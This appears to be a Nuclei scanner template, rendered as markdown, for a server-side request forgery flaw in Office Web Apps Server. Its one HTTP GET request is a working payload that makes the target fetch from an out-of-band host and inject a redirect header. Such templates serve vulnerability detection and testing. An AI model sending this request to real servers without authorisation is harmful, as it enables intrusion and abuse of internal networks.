# Nuclei Template: Office Web Apps Server Full Read - Server Side Request Forgery
**Template ID:** office-webapps-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`office-webapps-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
Office Web Apps Server Full Read is vulnerable to SSRF.

## Steps to reproduce / Exploit Payload
```http
GET /oh/wopi/files/@/wFileId/contents?wFileId=http://{{oast}}/{{string}}.xlsx%3fbody={{string}}%26header=Location:http://oast.pro%26status=302&access_token_ttl=0 HTTP/1.1
Host: {{Hostname}}
```

## References
- https://drive.google.com/file/d/1aeNq_5wVwHRR1np1jIRQM1hocrgcZ6Qu/view (Slide 37,38)
